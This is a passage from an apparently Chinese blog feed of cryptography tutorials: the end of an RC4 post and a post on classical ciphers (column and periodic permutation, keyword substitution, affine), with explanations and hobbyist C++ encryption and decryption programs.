text &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="结果">结果</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">请输入明文</span><br><span class="line"><span class="number">123</span></span><br><span class="line">请输入密钥</span><br><span class="line"><span class="number">123</span></span><br><span class="line">加密后的密文：b聦</span><br><span class="line">解密后的明文：<span class="number">123</span></span><br></pre></td></tr></table></figure><h2 id="三、小结">三、小结</h2><ol><li>加密时,将 <code>k</code>的值与明文字节异或;解密时,将<code>k </code>的值与密文字节异或。</li><li>为了保证安全强度,目前的 <code>RC4</code> 至少使用<code> 128</code> 位密,以防止穷举搜索攻击。</li><li><code>RC4</code> 算法可看成一个有限状态自动机,把 <code>S</code>表和索引的具体取值称为<code> RC4</code>的一个状态:$T=(S_0,S_1…S_{255},i,j)$。对状态 <code>T</code>进行非线性变化,产生出新的状态,并输出密钥序列中的一个字节<code>k</code>,大约有$ 2^{1700}(256! \times 256^2)$种可能状态。</li><li>用大的数据表 <code>S </code>和字长来实现这个思想是可能,如可定义 <code>16</code> 位<code> RC4</code>。</li></ol>]]></content>
    
    
    <summary type="html">RC4密码的原理及C++代码</summary>
    
    
    
    <category term="密码学" scheme="https://nonevector.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="RC4密码" scheme="https://nonevector.top/tags/RC4%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>古典密码</title>
    <link href="https://nonevector.top/posts/5.html"/>
    <id>https://nonevector.top/posts/5.html</id>
    <published>2023-10-27T00:40:49.934Z</published>
    <updated>2023-12-06T04:39:47.181Z</updated>
    
    <content type="html"><![CDATA[<h2 id="古典密码">古典密码</h2><p>从远古到 1949 年香农发表《保密系统的通信理论》，这期间人类所使用的密码均称为古典密码，本文主要介绍三种古典密码，分别为置换密码，代换密码和轮换密码。</p><blockquote><p>为了写 c++代码图个方便，下面的代码（大部分）都没有强调大小写 <s>因为懒</s>,但是不影响密码的基本思路<s>因为明文密钥之类的都是 String 类型，直接强行转大写或者小写就行</s></p></blockquote><h2 id="一、置换密码（列置换）">一、置换密码（列置换）</h2><p>置换密码（Permutation Cipher)又叫换位密码（Transposi-tionCipher)，它根据一定的规则重新排列明文，以便打破明文的结构特性。置换密码的特点是保持明文的所有字符不变，只是利用置换打乱了明文字符的位置和次序。<br>最常见的置换密码有两种：</p><ul><li>列置换密码（明文 P 遵照密钥的规程按列换位并且按列读出序列得到密文 C）；</li><li>周期置换密码（将明文 P 按固定长度 m 分组，然后对每组按 1，2…，m 的某个置换重排位置从而得到密文 C）。</li></ul><h3 id="定义">定义</h3><ul><li>有限集<code>X</code>上的运算<code>σ</code>：<code>X</code>→<code>X</code>被称为一个置换，则<code>σ</code>是一个双射函数，即<code>σ</code>即时单射又是满射，并且<code>σ</code>的定义域和值域相同</li><li>即任意 x∈X,存在唯一的 x’∈X，使得 σ(x)=x’</li><li>解密的时候会用到逆置换$σ^{-1}$</li><li>即任意 x’∈X,存在唯一的 x∈X，使得$σ^{-1}(x’)=x$</li><li>从置换 σ 和逆置换$σ^{-1}$的定义可以看出得，若$σ^{-1}(x’)=x$，当且仅当$σ(x)=x’$，并且满足$σσ^{-1}=I=(1)$</li></ul><p><s>有点晕，那么就直接看例子</s><br><img src="https://cdn.acwing.com/media/article/image/2023/10/27/169037_1581438074-4.jpg" alt="4.jpg"><br>最后给出公式若置换为 <s>其实找规律也看得出</s></p><p>$$<br>σ=(x_{11}x_{12}x_{13}···x_{1(l-1)}x_{1l})···(x_{m1}x_{m2}x_{m3}···x_{m(n-1)}x_{mn})<br>$$</p><p>相应的逆置换位</p><p>$$<br>σ^{-1}=(x_{11}x_{1l}x_{1(l-1)}···x_{13}x_{12})···(x_{m1}x_{mn}x_{m(n-1)}···x_{m3}x_{m2})<br>$$</p><h3 id="1-1-列置换">1.1 列置换</h3><h4 id="介绍-列置换">介绍(列置换)</h4><blockquote><p>这里只介绍列置换 <s>还有周期置换，但是都大差不差</s><br>列置换密码，顾名思义，按列换位并且按列读出明文序列得到密文，具体加密步骤如下</p></blockquote><ol><li>将明文<code>p</code>以固定分组长度 m 按行写出<code>nxm</code>阶矩阵（若不<code>m</code>倍数，空余部分空格<code>·</code>补充）</li><li>按<code>（1,2,3…m）</code>的置换<code>σ</code>交换列的位置,<code>σ</code>为密钥</li><li>把新得到的矩阵按列的顺序依次读出得到密文<code>c</code><br>解密过程如下</li><li>将密文<code>c</code>以固定的长度<code>n</code>按列写成<code>nxm</code>阶矩阵</li><li>按逆矩阵 $ σ^{-1} $ 交换列的位置</li><li>把矩阵按着行依次读出为明文</li></ol><p>大概意思看下图例子<br>这里解释一下加密：<br><code>(143)(56)</code>的意思是第<code>1</code>列和第<code>4</code>列交换，交换后的第<code>4</code>列和第<code>3</code>列换（即原本的第<code>1</code>列和第<code>3</code>列交换），第<code>5</code>列和第<code>6</code>列交换，即可<br><img src="https://cdn.acwing.com/media/article/image/2023/10/27/169037_46bfe9a874-1.jpg" alt="1.jpg"><br><img src="https://cdn.acwing.com/media/article/image/2023/10/27/169037_4923c98874-2.jpg" alt="2.jpg"></p><h4 id="C-源码">C++源码</h4><blockquote><p>纯模拟暴力写的，有时间再优化</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">110</span>; <span class="comment">// 暂定最大矩阵110</span></span><br><span class="line"></span><br><span class="line">string clear_matrix[N][N]; <span class="comment">// 明文的矩阵</span></span><br><span class="line">string secret_matrix[N][N]; <span class="comment">// 密文后的矩阵</span></span><br><span class="line"><span class="type">int</span> res; <span class="comment">// 判断是用与加密还是解密</span></span><br><span class="line"><span class="type">int</span> n, m; <span class="comment">// 矩阵的n和m</span></span><br><span class="line">string cleartext; <span class="comment">// 明文</span></span><br><span class="line">string secret_text; <span class="comment">// 密文</span></span><br><span class="line">string secret_key; <span class="comment">// 密钥</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap_matrix</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="comment">// 交换第a列和第b列</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(res == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">swap</span>(clear_matrix[i][a], clear_matrix[i][b]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">swap</span>(secret_matrix[i][a], secret_matrix[i][b]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(string a, string b, <span class="type">int</span> n, <span class="type">int</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>, t = <span class="number">0</span>; i &lt;= n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j ++ )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(a[t] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                t ++ ;</span><br><span class="line">            &#125;</span><br><span class="line">            clear_matrix[i][j] = a[t ++ ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(b[l] == <span class="string">&#x27;(&#x27;</span> &amp;&amp; b[r] != <span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        r ++ ;</span><br><span class="line">        <span class="keyword">if</span>(b[r] == <span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = l + <span class="number">1</span>; i &lt; r - <span class="number">1</span>; i ++ )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">swap_matrix</span>(b[i] - <span class="string">&#x27;0&#x27;</span>, b[i + <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            r ++ ;</span><br><span class="line">            l = r;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;以下是加密后的结果（＞人＜；）&quot;</span> &lt;&lt;endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j ++ )</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; clear_matrix[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解密</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decode</span><span class="params">(string a, string b, <span class="type">int</span> n, <span class="type">int</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>, t = <span class="number">0</span>; i &lt;= n; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>; j &lt;= m; j ++ )</span><br><span class="line">        &#123;</span><br><span class="line">            secret_matrix[i][j] = a[t ++ ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> l = b.<span class="built_in">size</span>(), r = b.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">while</span>(b[r - <span class="number">1</span>] == <span class="string">&#x27;)&#x27;</span> &amp;&amp; b[l - <span class="number">1</span>] != <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        l -- ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(b[l - <span class="number">1</span>] == <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = r - <span class="number">2</span>; i &gt; l; i -- )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">swap_matrix</span>(b[i] - <span class="string">&#x27;0&#x27;</span>, b[i - <span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            r = l - <span class="number">1</span>;</span><br><span class="line">            l = r;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;以下是解密后的结果  (^^ゞ&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j ++ )</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; secret_matrix[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;如果需要加密选择1， 解密选择2    －O－&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; res;</span><br><span class="line">    <span class="keyword">if</span>(res == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请依次输入明文，密钥，以及矩阵大小n,m   \(@^0^@)/&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">getline</span>(cin, cleartext);</span><br><span class="line">        <span class="built_in">getline</span>(cin, cleartext);</span><br><span class="line">        cin &gt;&gt; secret_key;</span><br><span class="line">        cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">        <span class="built_in">encrypt</span>(cleartext, secret_key, n ,m);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请依次输入密文，密钥，以及矩阵大小n,m   \(@^0^@)/&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">getline</span>(cin, secret_text);</span><br><span class="line">        <span class="built_in">getline</span>(cin, secret_text);</span><br><span class="line">        cin &gt;&gt; secret_key &gt;&gt; n &gt;&gt; m;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">decode</span>(secret_text, secret_key, n ,m);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果截图<br><img src="https://cdn.acwing.com/media/article/image/2023/10/27/169037_3c0d15da74-1.png" alt="1.png"><br><img src="https://cdn.acwing.com/media/article/image/2023/10/27/169037_3e65aa7474-2.png" alt="2.png"></p><h3 id="1-2-周期置换">1.2 周期置换</h3><h4 id="介绍">介绍</h4><p>周期置换密码是将明文 <code>p</code> 串按固定长度 m 分组，然后对每组中的字串按 1,2,3…,m 的某个置换重新排列位置从而得到密文，其中密钥<code>σ</code>包含分组长度信息。解密同样对密文<code>c</code>按长度<code>m</code>分组，并按<code>σ</code>的在逆置换$ σ^{-1} $把每组子串重新排列位置从而得到明文<code>p</code><br><img src="https://cdn.acwing.com/media/article/image/2023/10/27/169037_bb065e8374-3.jpg" alt="3.jpg"></p><h4 id="C-源码-2">C++源码</h4><blockquote><p>代码和列置换的一样就行 <s>就是速度不行 😪</s><br>注意一下输入就行，这里直接贴结果图<br><img src="https://cdn.acwing.com/media/article/image/2023/10/27/169037_aca1c21f74-3.png" alt="3.png"> &gt; <img src="https://cdn.acwing.com/media/article/image/2023/10/27/169037_af9cd43a74-4.png" alt="4.png"></p></blockquote><h2 id="二、代换密码">二、代换密码</h2><h3 id="1-单表代换密码">1. 单表代换密码</h3><p>单表代换密码指明文消息中相同的字母,在加密时都使用同一固定的字母来代换。单表代换密码又分为移位密码、基于密钥的单表代换密码和仿射密码 3 类,由于移位密码可以看作仿射密码的特例,所以下面只介绍基于密钥的单表密码和仿射密码。</p><h4 id="1-1-基于密钥的单表代换密码">1.1 基于密钥的单表代换密码</h4><h5 id="介绍-2">介绍</h5><p>1.基于密钥的单表代换密码<br>基于密钥的单表代换密码很多,其基本思想是类似的,下面通过一个具体实例来介绍单表代换密码。首先选取一个英文单词或字母串作为密钥,去掉其中重复的字母得到一个无重复字母的字母序列，然后将字母表中的其他字母按字母顺序依次写在此字母序列后面,如果密钥中的字母序列有重复则后出现的字母不再出现,从而使所有的字母建立一一对应关系,也就是字母代换表。这种单表代换密码破译的难度稍高,而且密钥更改便捷,因此增加了单表代换密码体制的灵活性。<br><img src="https://cdn.acwing.com/media/article/image/2023/10/28/169037_92105d1e75-5.jpg" alt="5.jpg"></p><h5 id="C-源码-3">C++源码</h5><blockquote><p>大小写和上面的图片比太一样，但应该不是什么大问题 <s>才不是懒</s></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">string cleartext; <span class="comment">// 明文</span></span><br><span class="line">string secret_text; <span class="comment">// 密文</span></span><br><span class="line">string secret_key; <span class="comment">// 密钥</span></span><br><span class="line">string clear_key; <span class="comment">// 明钥（用于解密）</span></span><br><span class="line"><span class="type">int</span> res; <span class="comment">// 判断加密还是解密</span></span><br><span class="line"><span class="type">char</span> encrypt_list[<span class="number">26</span>];</span><br><span class="line"><span class="type">char</span> encode_list[<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_encrypt_list</span><span class="params">(string b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = b.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        encrypt_list[i] = i + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        encrypt_list[b[i] - <span class="string">&#x27;a&#x27;</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(encrypt_list, encrypt_list + <span class="number">26</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        encrypt_list[i] = b[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_encode_list</span><span class="params">(string b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        encode_list[encrypt_list[i] - <span class="string">&#x27;a&#x27;</span>] = <span class="string">&#x27;a&#x27;</span> + i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(string a, string b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = a.<span class="built_in">size</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;加密后的密文是：&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; encrypt_list[a[i] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encode</span><span class="params">(string a, string b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">get_encode_list</span>(b); <span class="comment">// 获取解密代换表</span></span><br><span class="line">    <span class="type">int</span> len = a.<span class="built_in">size</span>();</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;解密后的明文是：&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= len; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; encode_list[a[i] - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入密钥&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; secret_key;</span><br><span class="line">    <span class="built_in">get_encrypt_list</span>(secret_key); <span class="comment">// 获取加密代换表</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请选择解密还是加密，加密选1，解密选2&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; res;</span><br><span class="line">    <span class="keyword">if</span>(res == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入明文&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; cleartext;</span><br><span class="line">        <span class="built_in">encrypt</span>(cleartext, secret_key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(res == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入密文&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; secret_text;</span><br><span class="line">        <span class="built_in">encode</span>(secret_text, secret_key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加密</span></span><br><span class="line">请输入密钥</span><br><span class="line">iscbupt</span><br><span class="line">请选择解密还是加密，加密选<span class="number">1</span>，解密选<span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">请输入明文</span><br><span class="line">cybergreatwall</span><br><span class="line">加密后的密文是：</span><br><span class="line">cysuntnuiqwigg</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密</span></span><br><span class="line">请输入密钥</span><br><span class="line">iscbupt</span><br><span class="line">请选择解密还是加密，加密选<span class="number">1</span>，解密选<span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">请输入密文</span><br><span class="line">cysuntnuiqwigg</span><br><span class="line">解密后的明文是：</span><br><span class="line">cybergreatwall</span><br></pre></td></tr></table></figure><h4 id="1-2-仿射密码">1.2 仿射密码</h4><h5 id="介绍-3">介绍</h5><p>仿射密码的加密算法就是一个线性变换,即对任意的明文字符<code>x</code>,对应的密文字符为 $y≡e(x)≡ax+b(mod 26)$,其中$a,b∈ Z_{26 }$,且要求 $gcd(a,26)=1$,函数 <code>e(x)</code>称为仿射加密函数。</p><ol><li><p>仿射加密函数要求 $gcd(a,26)=1$,即要求 <code>a </code>和<code> 26</code> 互素,否则$ e(x)≡ax+b(mod 26)$就不是一个单射函数。例如，当 $gcd(8,26)=2$ 时,因为对 x∈$Z_{26 }$,$8(x+13)+5=8x+109≡8x+5 (mod 26)$,所以和<code>x</code>和<code>x+13</code> 将被加密为相同的密文。故$ e(x)≡ 8x 十 5(mod 26)$不是一个有效的仿射加密函数。而当 $gcd(a,26)=1$ 时,仿射加密函数的解必然唯一。</p><blockquote><p>证明如下:</p><p>设存在 $x_1,x_2∈Z_{26}$,使得 $e(x)≡ ax_1 +b≡ax_2+b(mod 26)$,则必然有 $ax_1 ≡ax_2(mod 26)$,从而可以得到整除式 $26|a(x_1-x_2)$;又因为 $gcd(a,26)=1$,所以得 $26(x_1-x_2)$,由题设知 